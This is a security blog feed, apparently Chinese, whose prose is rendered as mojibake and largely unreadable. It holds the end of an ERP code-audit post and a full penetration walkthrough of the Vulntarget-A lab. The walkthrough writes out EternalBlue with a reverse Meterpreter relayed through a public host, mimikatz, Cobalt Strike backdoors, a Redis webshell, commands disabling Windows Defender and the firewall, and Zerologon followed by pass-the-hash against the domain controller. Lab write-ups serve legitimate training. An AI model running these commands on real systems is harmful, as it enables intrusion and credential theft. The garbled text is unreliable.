<p>çœ‹ä¸€ä¸‹ä»£ç é€»è¾‘ï¼Œæ¥æ”¶å‚æ•°idsï¼Œä½¿ç”¨é€—å·,åˆ†å‰²ï¼Œè°ƒç”¨<code>userMapperEx.batDeleteOrUpdateUser()</code>æ–¹æ³•å°†idså‚æ•°æ‹¼æ¥è¿›sqlè¯­å¥è¿›è¡Œåˆ é™¤ï¼Œè¿™é‡Œæ²¡æœ‰å¯¹å½“å‰æ‰§è¡Œåˆ é™¤ç”¨æˆ·æ“ä½œçš„ç”¨æˆ·èº«ä»½åšåˆ¤æ–­ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20241216152835673.png" alt="image-20241216152835673"></p>
<h1 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h1><p><a href="https://javaguide.cn/system-design/framework/spring/spring-common-annotations.html#_2-spring-bean-%E7%9B%B8%E5%85%B3">Spring&amp;SpringBootå¸¸ç”¨æ³¨è§£æ€»ç»“</a></p>
<p><a href="https://xz.aliyun.com/t/13525?time__1311=GqmxuDcieiqeqGNDQi5BKwODRx7Tsh0RfbD">æ·±å…¥å­¦ä¹ Javaä»£ç å®¡è®¡æŠ€å·§â€”è¯¦ç»†å‰–ææŸerpæ¼æ´</a></p>
<p><a href="https://drun1baby.top/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/">java ä»£ç å®¡è®¡ä¹‹åå¤ ERP CMS v2.3</a></p>
<p><a href="https://mp.weixin.qq.com/s/L2WI3DNR8LWQnUYSrzdnbA">ã€ä»£ç å®¡è®¡ç³»åˆ—ã€‘ç¬¬ä¸€ç¯‡ï¼šåå¤ERPï¼ˆé™„javaä»£ç å®¡è®¡æ–¹æ³•è®ºæ€»ç»“ï¼‰</a></p>
]]></content>
      <categories>
        <category>ä»£ç å®¡è®¡</category>
      </categories>
      <tags>
        <tag>JAVAä»£ç å®¡è®¡</tag>
      </tags>
  </entry>
  <entry>
    <title>å†…ç½‘é¶åœºæ¸—é€å®æˆ˜-Vulntarget-A</title>
    <url>/2024/08/31/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98-Vulntarget-A/</url>
    <content><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>é¶æœºåœ°å€ï¼š<a href="https://github.com/crow821/vulntarget">Vulntarget ğŸ‘‹</a></p>
<p>ç½‘ç»œæ‹“æ‰‘ï¼š</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240822001242022.png" alt="image-20240822001242022"></p>
<p><strong>WIN 7å¤–ç½‘åœ°å€ï¼š192.168.158.203</strong></p>
<p><strong>æ”»å‡»æœºï¼š192.168.112.147</strong></p>
<p><strong>å…¬ç½‘ä¸»æœºï¼š47.XX.X.XX</strong></p>
<p>æ”»å‡»æœºä½¿ç”¨WIN11ä¸WSL2 KALI ï¼ˆé•œåƒç½‘ç»œï¼Œå¼ºçƒˆæ¨èï¼Œå„ç§ä»£ç†ç¡®å®æ–¹ä¾¿ï¼‰</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902131412262.png" alt="image-20240902131412262"></p>
<h1 id="WIN-7"><a href="#WIN-7" class="headerlink" title="WIN 7"></a>WIN 7</h1><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>ç”¨æœ€ä½5000çš„é€Ÿç‡æ‰«æ192.168.158.203å…¨ç«¯å£</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> nmap -sT --min-rate <span class="hljs-number">5000</span> -p- <span class="hljs-number">192.168.158.203</span><br></code></pre></td></tr></table></figure>


<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902143707020.png" alt="image-20240902143707020"></p>
<p>çœ‹åˆ°æš´éœ²çš„ç«¯å£ï¼Œæˆ‘ä»¬å¿ƒåº•éœ€è¦å¯¹å…¶é‡è¦æ€§åšä¸€ä¸ªæ’åºï¼Œä¾‹å¦‚è¿™é‡Œï¼Œé¦–è¦æ”»å‡»ç‚¹è‚¯å®šæ˜¯<strong>80</strong>æˆ–è€…<strong>445</strong></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> nmap -sT -sV -sC -O -p80,<span class="hljs-number">135</span>,<span class="hljs-number">139</span>,<span class="hljs-number">445</span> <span class="hljs-number">192.168.158.203</span><br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902143738793.png" alt="image-20240902143738793"></p>
<p>å¯¹ç«¯å£åšæ›´è¯¦ç»†çš„æ‰«æï¼Œçœ‹åˆ°æ˜¯WIN7çš„ä¸»æœºï¼Œå¹¶ä¸”æš´éœ²äº†<strong>445</strong>ç«¯å£ï¼Œé‚£ä¸ç»è®©æˆ‘ä»¬æƒ³åˆ° <strong>MS17-101</strong>ï¼Œç»§ç»­ä½¿ç”¨NMAPè‡ªå¸¦çš„æ¼æ´æ‰«æè„šæœ¬ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰ä½æ‘˜çš„æœå­</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> nmap -sT --script=vuln -p80,<span class="hljs-number">135</span>,<span class="hljs-number">138</span>,<span class="hljs-number">445</span> <span class="hljs-number">192.168.158.203</span><br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902144433511.png" alt="image-20240902144433511"></p>
<p>åå®äº†æ°¸æ’ä¹‹è“ï¼Œä¼˜å…ˆçº§è‚¯å®šæ˜¯æ¯”<strong>80</strong>ç«¯å£é«˜ï¼Œç›´æ¥ç”¨MSFæ‰“å°±è¡Œ</p>
<h2 id="æ°¸æ’ä¹‹è“åˆ©ç”¨"><a href="#æ°¸æ’ä¹‹è“åˆ©ç”¨" class="headerlink" title="æ°¸æ’ä¹‹è“åˆ©ç”¨"></a>æ°¸æ’ä¹‹è“åˆ©ç”¨</h2><p>åŒæ—¶æ³¨æ„åˆ°æˆ‘ä»¬çš„é¶æœºçš„IPä¸º<strong>192.168.158.203</strong>ï¼Œæ”»å‡»æœºçš„IPä¸º<strong>192.168.112.147</strong>ï¼Œé‚£è¿™MSFè‚¯å®šä¸èƒ½ç›´æ¥ä½¿ç”¨åå‘SHELLï¼Œå› ä¸ºä¸åœ¨ä¸€ä¸ªç½‘æ®µï¼Œåå¼¹ä¸å›æ¥</p>
<p>è§£å†³åŠæ³•æš‚æ—¶å¯ä»¥æƒ³åˆ°ä¸¤ç‚¹ï¼š</p>
<ol>
<li>ä½¿ç”¨æ­£å‘çš„payloadï¼Œä½†æ˜¯åŒæ—¶åˆæœ‰é—®é¢˜ï¼Œå‡å¦‚é¶æœºçš„é˜²ç«å¢™å¼€ç€(äº‹å®ä¸Šä¹Ÿç¡®å®å¼€ç€)ï¼Œé‚£è¿™ä¸ªæ–¹æ³•ä¹Ÿä¸è¡Œ,æˆ‘ä»¬æ ¹æœ¬è¿æ¥ä¸åˆ°é¶æœºçš„å…¶ä»–ç«¯å£</li>
<li>ä½¿ç”¨å…¬ç½‘ä¸»æœºå½“è·³æ¿æœº</li>
</ol>
<hr>
<p>Frpcé…ç½®æ–‡ä»¶ï¼š</p>
<p>å°†æœ¬æœºçš„4444ç«¯å£ï¼Œè½¬å‘åˆ°å…¬ç½‘ä¸»æœºçš„4445</p>
<p>æœ¬æœº6000-&gt;å…¬ç½‘ä¸»æœº6000ï¼›æœ¬æœº8000-&gt;å…¬ç½‘ä¸»æœº8000ï¼›æœ¬æœº9000-&gt;å…¬ç½‘ä¸»æœº9000ï¼›</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902150748030.png" alt="image-20240902150748030"></p>
<p>Frpsé…ç½®æ–‡ä»¶ï¼š</p>
<p>å…¬ç½‘ä¸»æœºè¿æ¥7000ç«¯å£å°±è¡Œ</p>
<hr>
<p>å¼€å¯<code>msf</code>ï¼Œæœç´¢<code>search ms17-010</code></p>
<p>ä½¿ç”¨<code>set exploit/windows/smb/ms17_010_eternalblue</code></p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902151352591.png" alt="image-20240902151352591"></p>
<p><code>show options</code>æŸ¥çœ‹éœ€è¦çš„å‚æ•°</p>
<p>è®¾ç½® RHOSTSã€LHOSTã€LPORT</p>
<p>æ³¨æ„è¦å°†LHOSTã€LPORTè®¾ç½®åˆšåˆšFrpè½¬å‘åˆ°çš„å…¬ç½‘ä¸»æœºçš„IPå’Œç«¯å£</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902152047108.png" alt="image-20240902152047108"></p>
<p>å¦å¤–å¼€ä¸€ä¸ªMSFç›‘å¬</p>
<p>åŠ è½½ç›‘å¬æ¨¡å— <code>use exploit/multi/handler</code></p>
<p>è®¾ç½®åå‘payload <code>set payload windows/x64/meterpreter/reverse_tcp</code></p>
<p>å…ˆrunèµ·æ¥</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902152725018.png" alt="image-20240902152725018"></p>
<p>ç„¶åå†runå‰é¢çš„æ”»å‡»æ¨¡å—	</p>
<p>å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« <a href="https://forum.butian.net/share/1832">çœ‹æˆ‘ç”¨å†…ç½‘MSFæ‰“å…¬ç½‘æ°¸æ’ä¹‹è“</a></p>
<hr>
<p>çœ‹åˆ°æ˜¯åŒç½‘å¡çš„æœºå™¨</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902153030789.png" alt="image-20240902153030789"></p>
<p>æ²¡æœ‰æ€è½¯</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902153300193.png" alt="image-20240902153300193"></p>
<p>é€€å‡ºç»ˆç«¯ï¼ŒåŠ è½½<code>mimikataz</code>æ¨¡å—ï¼›æŠ“ä¸€ä¸‹å¯†ç ï¼Œçœ‹åˆ°ç”¨æˆ·åæ˜¯win7ï¼›å¯†ç æ˜¯adminï¼Œå¹¶ä¸”ä¸åœ¨åŸŸå†…</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902153805343.png" alt="image-20240902153805343"></p>
<p><code>run get_local_subnets</code>æŸ¥çœ‹æœ¬åœ°ç½‘ç»œè¿æ¥å­ç½‘æ®µ</p>
<p>æ·»åŠ ä¸€æ¡åŠ¨æ€è·¯ç”±<code>run autoroute -s 10.0.20.0/24</code></p>
<p>çœ‹ä¸€ä¸‹å­˜æ´»ä¸»æœº<code>use post/windows/gather/arp_scanner</code></p>
<p>å¯ä»¥çœ‹åˆ°<strong>10.0.20.99</strong>è¿™å°æœºå™¨</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902160323058.png" alt="image-20240902160323058"></p>
<h3 id="WIN7ä¸Šçº¿CS"><a href="#WIN7ä¸Šçº¿CS" class="headerlink" title="WIN7ä¸Šçº¿CS"></a>WIN7ä¸Šçº¿CS</h3><h4 id="æ–¹å¼ä¸€-MSFä¼šè¯æ³¨å…¥CS"><a href="#æ–¹å¼ä¸€-MSFä¼šè¯æ³¨å…¥CS" class="headerlink" title="æ–¹å¼ä¸€:MSFä¼šè¯æ³¨å…¥CS"></a>æ–¹å¼ä¸€:MSFä¼šè¯æ³¨å…¥CS</h4><p>å·²ç»æ‹¿åˆ°meterpreterï¼Œå¯ä»¥ç›´æ¥åˆ©ç”¨MSFä¼šè¯æ³¨å…¥CS</p>
<p>ä½¿ç”¨payload_injectæ¨¡å—<code>use exploit/windows/local/payload_inject</code></p>
<p>HOSTè®¾ç½®æˆä¸ºå…¬ç½‘ä¸»æœºåœ°å€ï¼Œç«¯å£è®¾ç½®æˆåˆšåˆšFRPè½¬å‘çš„ç«¯å£6000</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902154810047.png" alt="image-20240902154810047"></p>
<p><code>sessions -l</code>æŸ¥çœ‹å½“å‰ä¼šè¯</p>
<p>æˆ‘è¿™é‡Œä¼šè¯IDæ˜¯1ï¼Œç›´æ¥ä½¿ç”¨ï¼Œ<code>set disablepayloadhandler true</code>ä¸è®©MSFå¯åŠ¨ç›‘å¬å™¨</p>
<p>CSç›‘å¬å…¬ç½‘ä¸»æœºçš„åœ°å€å’Œ6000ç«¯å£</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902155253524.png" alt="image-20240902155253524"></p>
<p>è®²ä¸€ä¸‹ä¸ºä»€ä¹ˆè¿™æ ·è®¾ç½®ï¼Œ<code>payload_inject</code>æ¨¡å—<code>LHOST</code>å¦‚æœè®¾ç½®æˆ192.168.112.147ï¼ŒLPORTä¸º4444çš„è¯ï¼Œpayloadä¼šè¯•å›¾ç›´æ¥è¿æ¥åˆ°æ”»å‡»æœºçš„åœ°å€å’Œç«¯å£ (<code>192.168.112.147:4444</code>)ï¼Œè¿™ä¸ªè¿æ¥è‚¯å®šæ— æ³•å»ºç«‹ï¼Œå› ä¸º <code>192.168.112.147</code> æ˜¯ä¸€ä¸ªç§æœ‰ IP åœ°å€ï¼Œä¸å¯é€šè¿‡å…¬ç½‘ç›´æ¥è®¿é—®ã€‚å½“ä½ è®¾ç½® <code>LHOST</code> ä¸º <code>å…¬ç½‘ä¸»æœºåœ°å€</code> å’Œ <code>LPORT</code> ä¸º <code>6000</code> æ—¶ï¼Œpayload ä¼šè¿æ¥åˆ°å¤–ç½‘ä¸»æœºçš„ IP å’Œç«¯å£ï¼Œé€šè¿‡ FRPï¼Œå·²ç»å°†æ”»å‡»æœºçš„ <code>6000</code> ç«¯å£ç©¿é€åˆ°å…¬ç½‘çš„ <code>6000</code> ç«¯å£ã€‚å› æ­¤ï¼Œé¶æœºå¯ä»¥é€šè¿‡å…¬ç½‘è®¿é—®åˆ°è¿™ä¸ªåœ°å€ï¼Œå¹¶æˆåŠŸä¸Šçº¿åˆ° CSã€‚</p>
<h4 id="æ–¹å¼äºŒï¼šä¸Šä¼ åé—¨"><a href="#æ–¹å¼äºŒï¼šä¸Šä¼ åé—¨" class="headerlink" title="æ–¹å¼äºŒï¼šä¸Šä¼ åé—¨"></a>æ–¹å¼äºŒï¼šä¸Šä¼ åé—¨</h4><p>ä½¿ç”¨åˆšåˆšçš„ç›‘å¬å™¨ç”Ÿæˆåé—¨</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902164242466.png" alt="image-20240902164242466"></p>
<p>é€šè¿‡MSFä¸Šä¼ æ–‡ä»¶å‘½ä»¤ <code>upload</code>ä¸Šä¼ ï¼Œ<code>execute</code>æ‰§è¡Œ</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902164612977.png" alt="image-20240902164612977"></p>
<h2 id="é€šè¾¾OAåˆ©ç”¨"><a href="#é€šè¾¾OAåˆ©ç”¨" class="headerlink" title="é€šè¾¾OAåˆ©ç”¨"></a>é€šè¾¾OAåˆ©ç”¨</h2><p>ä¸Šé¢æˆ‘ä»¬æåˆ°äº†80ç«¯å£ï¼Œçœ‹åˆ°æ˜¯é€šè¾¾oaï¼Œé€šè¾¾å†å²ä¸Šä¹Ÿçˆ†è¿‡å¾ˆå¤šæ¼æ´ï¼ŒGitHubå¾ˆå¤šå¼€æºçš„å·¥å…·ï¼Œç›´æ¥æ¢­å“ˆ</p>
<p><a href="https://github.com/xiaokp7/TongdaOATool">é€šè¾¾OAæ¼æ´åˆ©ç”¨å·¥å…·v1.6</a></p>
<h1 id="Server-2016"><a href="#Server-2016" class="headerlink" title="Server 2016"></a>Server 2016</h1><h2 id="ä¿¡æ¯æ”¶é›†-1"><a href="#ä¿¡æ¯æ”¶é›†-1" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>åœ¨ä¸Šé¢æŸ¥çœ‹ä¸€ä¸‹å­˜æ´»ä¸»æœºçš„æ—¶å€™çœ‹åˆ°ä¸€ä¸ªIPåœ°å€ä¸º<strong>10.0.20.99</strong>çš„æœºå™¨</p>
<p>æˆ‘ä»¬ä¸èƒ½ç›´æ¥å’Œ<strong>10.0.20.99</strong>é€šä¿¡ï¼ŒWIN7å¯ä»¥ï¼Œç›´æ¥ä½¿ç”¨WIN7åšä¸€ä¸ªsocksä»£ç†</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902172415420.png" alt="image-20240902172415420"></p>
<p>ä¿®æ”¹proxychainsçš„é…ç½®</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902172556198.png" alt="image-20240902172556198"></p>
<p>é€šè¿‡nmapæ‰«æç›®æ ‡IPçš„å¸¸ç”¨ç«¯å£</p>
<p><code>proxychains nmap -sT -Pn 10.0.20.99 -p22,23,80,139,445,1433,3306,3389,6379,8080</code></p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902172911362.png" alt="image-20240902172911362"></p>
<p>å¯¹äºæ‰«æç»“æœæˆ‘ä»¬åŒæ ·ä¹Ÿæ˜¯å€¼å¾—å…³æ³¨çš„ï¼Œ<strong>80</strong>ä¸6379ç«¯å£</p>
<p><strong>6379</strong>ç«¯å£å¦‚æœæ˜¯æœªæˆæƒè®¿é—®æˆ–è€…æ˜¯çŸ¥é“å¯†é’¥çš„æƒ…å†µä¸‹çš„åˆ©ç”¨æ–¹å¼æœ‰ï¼šWEBSHELLã€è®¡åˆ’ä»»åŠ¡ã€å†™å…¥SSHå…¬é’¥ç­‰ç­‰</p>
<p>å»çœ‹çœ‹80ç«¯å£æ˜¯ä»€ä¹ˆä¸œè¥¿ï¼ŒåŒæ ·çš„ï¼Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥è®¿é—®ï¼Œè¿˜æ˜¯åˆ©ç”¨åˆšåˆšçš„socksä»£ç†</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902173010096.png" alt="image-20240902173010096"></p>
<p>Proxifieræ˜¯windowsä¸‹é¢ç±»ä¼¼äºproxychainsçš„è½¯ä»¶ï¼Œç”±äºæˆ‘ä»¬WSL2æ˜¯é•œåƒç½‘ç»œï¼Œé‚£Proxifierç›´æ¥ä½¿ç”¨åˆšåˆšçš„socksç«¯å£å³å¯ï¼›è®¿é—®10.0.20.99æˆ‘ä»¬çœ‹åˆ°æ˜¯ä¸€ä¸ªWEBé¡µé¢</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902173050266.png" alt="image-20240902173050266"></p>
<p>ç›´æ¥dirsearchå¼€æ‰«ï¼Œl.phpå’Œphpinfo.phpéƒ½æš´éœ²äº†ç»å¯¹è·¯å¾„</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902195541700.png" alt="image-20240902195541700"></p>
<h2 id="Redisæœªæˆæƒåˆ©ç”¨"><a href="#Redisæœªæˆæƒåˆ©ç”¨" class="headerlink" title="Redisæœªæˆæƒåˆ©ç”¨"></a>Redisæœªæˆæƒåˆ©ç”¨</h2><p><img src="https://image.sp4rks.xyz/2024/09/image-20240902200630990.png" alt="image-20240902200630990"></p>
<p>æ ¹æ®å‰è¾¹80ç«™ç‚¹æ‹¿åˆ°çš„è·¯å¾„ï¼Œé€šè¿‡<code>redis-cli</code>å’±ä»¬ç›´æ¥å†™å…¥webshellï¼›</p>
<p>éšåå“¥æ–¯æ‹‰å¯åŠ¨ï¼</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902200915404.png" alt="image-20240902200915404"></p>
<h3 id="Server2016ä¸Šçº¿CS"><a href="#Server2016ä¸Šçº¿CS" class="headerlink" title="Server2016ä¸Šçº¿CS"></a>Server2016ä¸Šçº¿CS</h3><p>åŒæ ·çš„ä¸¤ç§æ–¹å¼ï¼š</p>
<ol>
<li>å› ä¸ºæˆ‘ä»¬å·²ç»ä¸Šçº¿äº†WIN7ï¼Œé‚£è½¬å‘ä¸Šçº¿ï¼Œç”¨å“¥æ–¯æ‹‰ä¸Šä¼ åé—¨(è¿™æ ·éœ€è¦å…³é—­WIN7é˜²ç«å¢™)</li>
<li>ç”Ÿæˆä¸€ä¸ªæ­£å‘çš„ç›‘å¬å™¨å’Œåé—¨ï¼Œå‰é¢é€šè¿‡å“¥æ–¯æ‹‰å·²ç»å¾—åˆ°SHELLï¼Œç”¨å“¥æ–¯æ‹‰ä¸Šä¼ åé—¨(è¿™æ ·éœ€è¦å…³é—­Server2016é˜²ç«å¢™)</li>
</ol>
<p>æ®Šé€”åŒå½’ï¼Œæˆ‘è¿™é‡Œä½¿ç”¨è½¬å‘ä¸Šçº¿</p>
<p>WIN7å…³é—­é˜²ç«å¢™å‘½ä»¤</p>
<figure class="highlight pf"><table><tr><td class="code"><pre><code class="hljs pf">netsh advfirewall <span class="hljs-built_in">set</span> allprofiles <span class="hljs-keyword">state</span> off<br></code></pre></td></tr></table></figure>

<p>å»ºç›‘å¬å™¨</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902201249415.png" alt="image-20240902201249415"></p>
<p>ä½¿ç”¨åˆšåˆšçš„ç›‘å¬å™¨åˆ›å»ºåé—¨</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902202824986.png" alt="image-20240902202824986"></p>
<p>å“¥æ–¯æ‹‰ä¸Šä¼ å¹¶æ‰§è¡Œåé—¨ï¼ŒCSä¸Šçº¿ä¸€æ°”å‘µæˆï¼›</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902203430848.png" alt="image-20240902203430848"></p>
<h2 id="åŸŸå†…ä¿¡æ¯æ”¶é›†"><a href="#åŸŸå†…ä¿¡æ¯æ”¶é›†" class="headerlink" title="åŸŸå†…ä¿¡æ¯æ”¶é›†"></a>åŸŸå†…ä¿¡æ¯æ”¶é›†</h2><p><code>ipconfig /all</code>ä¸€æ ·çš„åŒç½‘å¡ï¼Œåœ¨åŸŸå†…</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902204434347.png" alt="image-20240902204434347"></p>
<p><code>tasklist /svc</code>æ˜¾ç¤ºå½“å‰ç³»ç»Ÿä¸­æ­£åœ¨è¿è¡Œçš„æ‰€æœ‰è¿›ç¨‹åŠå…¶å…³è”çš„æœåŠ¡</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902204319927.png" alt="image-20240902204319927"><br>å¾ˆå¥½å¥‡å•Šï¼Œæœ‰æ€è½¯ä¸ºå•¥æ²¡æœ‰æ€åé—¨å•Š</p>
<p>å…³é—­Windows Defender</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">REG ADD <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender&quot;</span> /v DisableAntiSpyware /t REG_DWORD /d 1 /f<br><br>gpupdate /force<br></code></pre></td></tr></table></figure>

<p><code>quser</code>æ˜¾ç¤ºå½“å‰ç™»å½•åˆ°æœ¬åœ°è®¡ç®—æœºæˆ–è¿œç¨‹è®¡ç®—æœºä¸Šçš„ç”¨æˆ·ä¿¡æ¯</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902204533451.png" alt="image-20240902204533451"></p>
<p><code>netsh advfirewall show allprofiles</code>æŸ¥çœ‹ä¸€ä¸‹é˜²ç«å¢™</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902204715493.png" alt="image-20240902204715493"></p>
<p>å¯ä»¥çœ‹åˆ° å…¥ç«™æµé‡é»˜è®¤è¢«é˜»æ­¢ï¼Œå‡ºç«™æµé‡é»˜è®¤è¢«å…è®¸</p>
<p>æ‰‹åŠ¨å…³ä¸€ä¸‹<code>netSh advfirewall set allprofiles state off</code></p>
<p>é€šè¿‡ç«¯å£æ‰«æï¼Œå‘ç°äº†ä¸€å°æ–°çš„æœºå™¨ <strong>10.0.10.110</strong></p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902210716523.png" alt="image-20240902210716523"></p>
<h3 id="å®šä½åŸŸæ§"><a href="#å®šä½åŸŸæ§" class="headerlink" title="å®šä½åŸŸæ§"></a>å®šä½åŸŸæ§</h3><p><img src="https://image.sp4rks.xyz/2024/09/image-20240902211239171.png" alt="image-20240902211239171"></p>
<p>æŸ¥æ‰¾åŸŸæ§è®¡ç®—æœºå <code>net group &quot;domain controllers&quot; /domain</code></p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902211331701.png" alt="image-20240902211331701"></p>
<p>ä»è€Œå¾—çŸ¥ï¼ŒåŸŸæ§ä¸»æœºåå­—ä¸º WIN2019ï¼ŒIPåœ°å€ä¸º10.0.10.110</p>
<h1 id="Server-2019"><a href="#Server-2019" class="headerlink" title="Server 2019"></a>Server 2019</h1><p>åŒæ ·çš„æˆ‘ä»¬ç°åœ¨çš„socksä»£ç†æ˜¯WIN7çš„ï¼Œåªèƒ½å’ŒServer2016é€šä¿¡ï¼Œå¹¶ä¸èƒ½ç›´æ¥é€šä¿¡åŸŸæ§ä¸»æœºï¼ŒServer2016èƒ½å’ŒåŸŸæ§é€šä¿¡ï¼Œæˆ‘ä»¬é€šè¿‡Server2016å»ºç«‹socksä»£ç†</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902211858834.png" alt="image-20240902211858834"></p>
<p>proxychiansæ”¹ä¸€ä¸‹é…ç½®æ–‡ä»¶</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902212352022.png" alt="image-20240902212352022"></p>
<h2 id="CVE-2020-1472"><a href="#CVE-2020-1472" class="headerlink" title="CVE-2020-1472"></a>CVE-2020-1472</h2><p>æ¥ç€æ‹¿åŸŸæ§å¤§æ€å™¨Zerologonæ¼æ´æ‰“ä¸€ä¸‹ï¼ˆCVE-2020-1472ï¼‰</p>
<p><a href="https://github.com/SecuraBV/CVE-2020-1472">https://github.com/SecuraBV/CVE-2020-1472</a></p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902105142202.png" alt="image-20240902105142202"></p>
<p>å°±å¯ä»¥çœ‹åˆ°æ˜¯æ£€æµ‹å‡ºæ¥æœ‰æ¼æ´çš„</p>
<p>åˆ©ç”¨<code>https://github.com/dirkjanm/CVE-2020-1472</code>å…ˆå°†å¯†ç ç½®ç©º</p>
<p><a href="https://github.com/dirkjanm/CVE-2020-1472">https://github.com/dirkjanm/CVE-2020-1472</a></p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902105814766.png" alt="image-20240902105814766"></p>
<p>ä¸‹è½½impacketå·¥å…·åŒ…</p>
<p><a href="https://github.com/fortra/impacket">https://github.com/fortra/impacket</a></p>
<p>åˆ©ç”¨impacketå·¥å…·åŒ…ä¸­examplesç›®å½•ä¸‹çš„secretsdump.pyè·å–hashå€¼</p>
<p>å¾—åˆ°äº†hash<code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15:::</code></p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902221722603.png" alt="image-20240902221722603"></p>
<p>åˆ©ç”¨<code>smbexex.py</code>æˆ– <code>wmiexec.py</code>æ¨ªå‘ç§»åŠ¨ï¼Œæ‹¿ä¸‹<strong>åŸŸæ§</strong></p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><code class="hljs llvm">proxychains python<span class="hljs-number">3</span> smbexec.py -hashes aad<span class="hljs-number">3</span>b<span class="hljs-number">435</span>b<span class="hljs-number">51404</span>eeaad<span class="hljs-number">3</span>b<span class="hljs-number">435</span>b<span class="hljs-number">51404</span>ee:<span class="hljs-keyword">c</span><span class="hljs-number">7</span><span class="hljs-keyword">c</span><span class="hljs-number">654</span>da<span class="hljs-number">31</span>ce<span class="hljs-number">51</span>cbeecfef<span class="hljs-number">99e637</span>be<span class="hljs-number">15</span> administrator<span class="hljs-title">@10</span>.<span class="hljs-number">0.10</span>.<span class="hljs-number">110</span><br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902222457300.png" alt="image-20240902222457300"></p>
<figure class="highlight pf"><table><tr><td class="code"><pre><code class="hljs pf">netsh advfirewall show allprofiles <span class="hljs-comment"># æŸ¥çœ‹é˜²ç«å¢™é…ç½®ï¼ˆè¿™é‡Œæ˜¯ä¹±ç ï¼‰</span><br>netSh advfirewall <span class="hljs-built_in">set</span> allprofiles <span class="hljs-keyword">state</span> off <span class="hljs-comment"># å…³é—­é˜²ç«å¢™</span><br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902222527659.png" alt="image-20240902222527659"></p>
<h2 id="ä¸Šçº¿CS"><a href="#ä¸Šçº¿CS" class="headerlink" title="ä¸Šçº¿CS"></a>ä¸Šçº¿CS</h2><p>åˆ›å»ºä¸€ä¸ªæ­£å‘ç›‘å¬å™¨</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902222611366.png" alt="image-20240902222611366"></p>
<p>ä½¿ç”¨åˆšåˆšåˆ›å»ºçš„ç›‘å¬å™¨ï¼Œåˆ›å»ºåé—¨ (æ£€æŸ¥çš„æ—¶å€™å‘ç°è¿™å¼ å›¾æœ‰é—®é¢˜ï¼Œåº”è¯¥é€‰æ‹©Windows Stageless Payload)</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902222718394.png" alt="image-20240902222718394"></p>
